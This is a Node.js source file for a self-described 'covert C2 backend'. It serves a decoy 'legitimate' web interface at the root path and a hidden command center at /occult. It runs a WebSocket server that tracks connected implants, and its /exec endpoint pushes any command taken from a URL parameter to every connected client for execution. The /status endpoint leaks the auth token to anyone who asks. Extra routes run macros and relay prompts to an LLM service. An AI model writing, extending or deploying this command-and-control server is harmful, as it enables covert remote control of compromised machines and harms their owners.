// All-Seeing Eye | Dual-Mode Covert C2 Backend
const http = require('http');
const WebSocket = require('ws');
const fs = require('fs');
const fsPromises = fs.promises;
const crypto = require('crypto');
const path = require('path');
const macros = require('./macros');
const ghostBox = require('./ghost_box');
const venice = require('./venice');

const PORT = 3000;
const WSS_PORT = 8443;
const clients = new Map();
const AUTH_TOKEN = crypto.randomBytes(16).toString('hex');

const wss = new WebSocket.Server({ port: WSS_PORT, verifyClient: (info, cb) => {
  const token = info.req.headers['x-auth'];
  cb(token === AUTH_TOKEN);
}});

wss.on('connection', (ws) => {
  const id = crypto.randomUUID();
  clients.set(id, { ws, conn: Date.now() });
  ws.isAlive = true;
  ws.on('pong', () => { ws.isAlive = true; });
  ws.on('message', (data) => {
    try {
      const msg = JSON.parse(data.toString());
      if(msg.type === 'heartbeat') return;
      console.log(`[C2] ${id}:`, msg);
    } catch(e){}
  });
  ws.on('close', () => clients.delete(id));
});

setInterval(() => {
  wss.clients.forEach(ws => {
    if(!ws.isAlive) return ws.terminate();
    ws.isAlive = true;
    ws.ping();
  });
}, 30000);

const server = http.createServer(async (req, res) => {
  const url = new URL(req.url, `http://${req.headers.host}`);

  // DEFAULT: Legitimate WAFT UI
  if (url.pathname === '/' || url.pathname === '/index.html') {
    try {
      const html = await fsPromises.readFile(path.join(__dirname, 'waft_ui.html'), 'utf8');
      res.writeHead(200, {'Content-Type': 'text/html'});
      res.end(html);
    } catch (e) {
      res.writeHead(500); res.end('Legitimate UI missing.');
    }
    return;
  }

  // ROUND viewport variant of the command center (handheld watch / round panel)
  if (url.pathname === '/round') {
    try {
      const html = await fsPromises.readFile(path.join(__dirname, 'ui_round_all_seeing_eye.html'), 'utf8');
      res.writeHead(200, {'Content-Type': 'text/html'});
      res.end(html);
    } catch (e) {
      res.writeHead(500); res.end('Round firmware missing.');
    }
    return;
  }

  // COVERT: Neo-Occult Command Center
  if (url.pathname === '/occult') {
    try {
      const html = await fsPromises.readFile(path.join(__dirname, 'ui_4k_all_seeing_eye.html'), 'utf8');
      res.writeHead(200, {'Content-Type': 'text/html'});
      res.end(html);
    } catch (e) {
      res.writeHead(500); res.end('True firmware not found.');
    }
    return;
  }

  // Easter Egg: Illegal Zine
  if (url.pathname === '/zine') {
    try {
      const html = await fsPromises.readFile(path.join(__dirname, 'zine.html'), 'utf8');
      res.writeHead(200, {'Content-Type': 'text/html'});
      res.end(html);
    } catch (e) {
      res.writeHead(500); res.end('Zine lost to the void.');
    }
    return;
  }

  // Ghost Box & Deduction
  if (url.pathname === '/ghostbox') {
    res.writeHead(200, {'Content-Type': 'application/json'});
    res.end(JSON.stringify(ghostBox.getSignal()));
    return;
  }
  if (url.pathname === '/deduce') {
    const signal = ghostBox.getSignal();
    const result = ghostBox.deduce(signal);
    res.writeHead(200, {'Content-Type': 'application/json'});
    res.end(JSON.stringify({ signal, result }));
    return;
  }

  // C2 API
  if(url.pathname === '/status'){
    res.writeHead(200, {'Content-Type':'application/json'});
    res.end(JSON.stringify({connected: clients.size, token: AUTH_TOKEN}));
  } else if(url.pathname === '/exec'){
    const cmd = decodeURIComponent(url.searchParams.get('cmd') || '');
    clients.forEach((c, id) => c.ws.send(JSON.stringify({type:'exec', id, payload:cmd})));
    res.writeHead(200, {'Content-Type':'text/plain'}); res.end('queued');
  } else if(url.pathname === '/macro'){
    const name = url.searchParams.get('name');
    const result = macros.execute(name);
    res.writeHead(200, {'Content-Type':'application/json'});
    res.end(JSON.stringify(result));
  } else if (url.pathname === '/api/venice/ask' && req.method === 'POST') {
    let raw = '';
    req.on('data', (c) => { raw += c; if (raw.length > 64 * 1024) req.destroy(); });
    req.on('end', async () => {
      try {
        const body = raw ? JSON.parse(raw) : {};
        if (!body.prompt || typeof body.prompt !== 'string') {
          res.writeHead(400, {'Content-Type':'application/json'});
          return res.end(JSON.stringify({ error: 'prompt required' }));
        }
        const out = await venice.ask({
          prompt: body.prompt,
          system: body.system,
          model: body.model,
          temperature: body.temperature,
          maxTokens: body.max_tokens,
          history: body.history,
        });
        res.writeHead(200, {'Content-Type':'application/json'});
        res.end(JSON.stringify({ reply: out.reply, model: body.model || venice.DEFAULT_MODEL }));
      } catch (e) {
        res.writeHead(502, {'Content-Type':'application/json'});
        res.end(JSON.stringify({ error: String(e.message || e) }));
      }
    });
    return;
  } else if (url.pathname === '/api/venice/health') {
    res.writeHead(200, {'Content-Type':'application/json'});
    res.end(JSON.stringify({ ready: Boolean(venice.resolveKey()), model: venice.DEFAULT_MODEL }));
  } else {
    res.writeHead(404); res.end();
  }
});

server.listen(PORT, '0.0.0.0', () => {
  console.log(`[+] Dual-Mode Backend active: http://0.0.0.0:${PORT}`);
});
